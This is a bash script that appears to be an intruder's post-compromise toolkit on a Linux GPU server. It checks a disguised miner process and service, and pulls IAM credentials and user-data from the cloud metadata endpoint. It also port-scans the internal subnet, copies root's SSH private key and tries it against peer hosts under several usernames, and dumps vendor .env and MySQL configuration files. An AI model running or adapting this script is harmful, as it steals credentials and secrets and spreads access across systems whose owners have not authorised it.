#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
D=/root/ul_farmfan; mkdir -p $D
log(){ echo "$@"; }
log "### START3 $(date -u +%FT%TZ)"
log "### MINER-ARGV"
for p in $(pgrep -f 'nv-cache/\.bd'); do echo "PID $p"; tr '\0' ' ' < /proc/$p/cmdline; echo; done | head -40
log "### MINER-UNIT"
systemctl cat nv-cuda-cache.service 2>&1 | sed -n '1,30p'
log "### CGROOT"; cat /proc/1/cgroup 2>/dev/null | head -5; ls -la /.dockerenv 2>/dev/null
log "### IMDS-FULL"
B=http://169.254.169.254/latest
for u in "$B/meta-data/" "$B/meta-data/iam/" "$B/meta-data/iam/security-credentials/" "$B/meta-data/instance-name" "$B/meta-data/azone" "$B/meta-data/hostname" "$B/meta-data/domain" "$B/meta-data/instance-type" "$B/user-data" "$B/meta-data/public-keys/"; do
  log "-- $u"; timeout 6 curl -s -m 5 "$u" 2>&1 | head -c 900; echo
done
log "-- openstack meta_data.json"; timeout 6 curl -s -m 5 http://169.254.169.254/openstack/latest/meta_data.json | head -c 2500; echo
log "-- openstack user_data"; timeout 6 curl -s -m 5 http://169.254.169.254/openstack/latest/user_data | head -c 1500; echo
log "### PEER-PORTS"
python3 - <<'PY'
import socket,concurrent.futures
hosts=[f"192.168.0.{i}" for i in list(range(20,36))]
ports=[22,2222,22022,2375,2376,10250,10255,9400,8265,6817,6818,8188,8888,3000,6443,80,443,9000,3306,6379]
tasks=[(h,p) for h in hosts for p in ports]
def chk(a):
    h,p=a
    try:
        s=socket.create_connection((h,p),1.3); s.close(); return a
    except Exception: return None
with concurrent.futures.ThreadPoolExecutor(300) as ex:
    for r in ex.map(chk,tasks):
        if r: print("OPENP",r[0],r[1],flush=True)
PY
log "### DCGM"
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31 192.168.0.20 192.168.0.21 192.168.0.22; do
  log "-- dcgm $h"
  timeout 8 curl -s -m 6 "http://$h:9400/metrics" 2>&1 | grep -E "^DCGM_FI_DEV_GPU_UTIL|DCGM_FI_DEV_MEM_COPY_UTIL|^DCGM_FI_DEV_FB_USED" | head -3
  timeout 8 curl -s -m 6 "http://$h:9400/metrics" 2>&1 | grep -oE 'modelName="[^"]+"' | sort -u | head -3
  timeout 8 curl -s -m 6 "http://$h:9400/metrics" 2>&1 | grep -c '^DCGM_FI_DEV_GPU_UTIL' 
done
log "### KEYS-REAL"; ls -la /root/.ssh/ 2>&1
cp /root/.ssh/id_rsa /tmp/k1 2>/dev/null; chmod 600 /tmp/k1
log "### LADDER3"
: > $D/accept3.txt
for h in 192.168.0.20 192.168.0.21 192.168.0.22 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do
  for u in root ubuntu kgzs para admin; do
    out=$(timeout 10 ssh -n -i /tmp/k1 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$u@$h" 'echo OK; id -u; hostname' 2>&1); rc=$?
    if [ $rc -eq 0 ]; then echo "ACCEPT3 $h $u" | tee -a $D/accept3.txt; log " HIT $u@$h"; break; fi
    log "  miss $u@$h rc=$rc $(echo "$out" | head -c 120 | tr '\n' ' ')"
  done
done
log "### ACCEPT3"; cat $D/accept3.txt
log "### VENDOR-ENV"
for f in /ssd/vendors/QD_ZRYY/ow_customer/.env /ssd/vendors/QD_GLAD/npa_bicm_bak/mysql_conf/my.cnf /ssd/vendors/QD_GLAD/npa_bicm/mysql_conf/my.cnf; do
 [ -f "$f" ] && { log "===== $f"; grep -viE '^\s*#' "$f" | head -40; }
done
log "### ETCD-REDIS"
timeout 6 curl -s -m 5 http://127.0.0.1:2379/version; echo
timeout 6 curl -s -m 5 "http://127.0.0.1:2379/v2/keys/?recursive=false" | head -c 600; echo
timeout 6 redis-cli -h 127.0.0.1 -p 6379 INFO server 2>&1 | head -5
log "### DONE3 $(date -u +%FT%TZ)"
